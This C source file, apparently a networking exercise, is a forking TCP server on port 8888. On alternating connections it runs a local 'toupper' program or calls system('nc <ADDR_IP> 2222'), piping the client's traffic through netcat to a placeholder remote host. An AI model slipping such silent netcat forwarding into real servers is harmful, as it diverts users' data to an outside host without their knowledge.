#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <unistd.h>
#include <stdlib.h>
#include <strings.h>

#define FILDES_IN 0
#define FILDES_OUT 1
#define FILDES_ERROR 2

void error(char *msg) {
    perror(msg);
    exit(1);
}

int main(void) {
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);

    if(sockfd < 0) {
        error("ERROR opening socket");
    }

    struct sockaddr_in serv_addr, cli_addr;
    bzero((char *) &serv_addr, sizeof(serv_addr));
    int portno = 8888;
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = INADDR_ANY;
    serv_addr.sin_port = htons(portno);

    if(bind(sockfd, (struct sockaddr *) &serv_addr,
            sizeof(serv_addr)) < 0) {
        error("ERROR on binding");
    }
    
    listen(sockfd, 5);
    int clilen = sizeof(cli_addr);

    int counter = 0;

    while(1) {
        int newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);

        if(newsockfd < 0) {
            error("ERROR on accept");
        }

        //char buffer[256];
        //bzero(buffer,256);
        //int n = read(newsockfd,buffer,255);
        //if (n < 0) error("ERROR reading from socket");
        //printf("Here is the message: %s\n",buffer);
        //n = write(newsockfd,"I got your message",18);
        //if (n < 0) error("ERROR writing to socket");

        pid_t pid = fork();

        if(pid < 0) {
            error("ERROR on fork"); 
        }

        if(pid == 0) {
            close(sockfd);
 
            if(counter % 2 == 0) {
                if(dup2(newsockfd, FILDES_IN) < 0) {
                    error("ERROR dup2 stdin");
                }
                if(dup2(newsockfd, FILDES_OUT) < 0) {
                    error("ERROR dup2 stdout");
                }

                close(newsockfd);

                //execlp("./toupper", "toupper", NULL);
                system("nc <ADDR_IP> 2222"); //Find the ip to change here
                //error("ERROR on execlp");
            } else {
               if(dup2(newsockfd, FILDES_IN) < 0) {
                    error("ERROR dup2 stdin");
                }
                if(dup2(newsockfd, FILDES_OUT) < 0) {
                    error("ERROR dup2 stdout");
                }

                close(newsockfd);

                execlp("./toupper", "toupper", NULL);
                //system("nc <ADDR_IP> 2222"); //Find the ip to change here
                error("ERROR on execlp");
    
            }

        } else {
            close(newsockfd);
            counter++;
            while(waitpid(-1, NULL, WNOHANG) > 0);
        }
    }

    close(sockfd);
    
    return 0;
}
